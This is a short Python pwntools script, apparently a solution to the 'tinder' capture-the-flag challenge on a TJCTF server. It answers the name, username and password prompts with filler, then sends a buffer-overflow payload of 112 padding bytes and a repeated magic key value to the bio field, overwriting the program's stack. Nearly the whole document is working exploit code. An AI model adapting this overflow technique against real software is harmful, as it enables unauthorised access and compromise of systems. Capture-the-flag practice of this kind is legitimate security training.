from pwn import *


local = 0

if local:
	p = process('./tinder')
else:
	p = remote('p1.tjctf.org', 8002)


padding = "D" * 112
#ebp = "B" *4 
eip = p32(0x08048976)
key = p32(0xC0D3D00D)
payload = padding + key + key

print(p.recvline())

print(p.recvuntil("Name: "))
p.sendline("A"*16)

print(p.recvuntil("Username: "))
p.sendline("A"*16)

print(p.recvuntil("Password: "))
p.sendline("A"*16)

print(p.recvuntil("Tinder Bio: "))
p.sendline(payload)

print(p.recvall())

p.close()